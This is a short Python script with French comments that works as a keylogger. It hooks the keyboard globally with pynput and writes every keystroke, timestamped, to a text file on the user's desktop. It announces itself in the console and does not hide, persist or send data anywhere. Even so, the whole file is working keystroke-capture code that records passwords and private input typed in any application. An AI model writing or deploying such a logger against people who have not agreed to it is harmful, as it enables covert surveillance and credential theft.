import logging
import os
from pynput import keyboard

# 1. Définition du fichier de log sur le Bureau
user_profile = os.environ.get('USERPROFILE')
desktop = os.path.join(user_profile, 'Desktop')
log_file = os.path.join(desktop, "capture_clavier.txt")

print("--- KEYLOGGER ACTIF ---")
print(f"Fichier de sortie : {log_file}")
print("Tapez du texte n'importe où. (CTRL+C dans cette fenêtre pour arrêter)")

# 2. Configuration de l'enregistrement
logging.basicConfig(
    filename=log_file, 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        k = str(key).replace("'", "")
        if key == keyboard.Key.space:
            k = " [ESPACE] "
        elif key == keyboard.Key.enter:
            k = " [ENTREE]\n"
        
        print(f"Capture: {k}")
        logging.info(k)
    except Exception as e:
        pass

# 3. Lancement de l'écoute
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
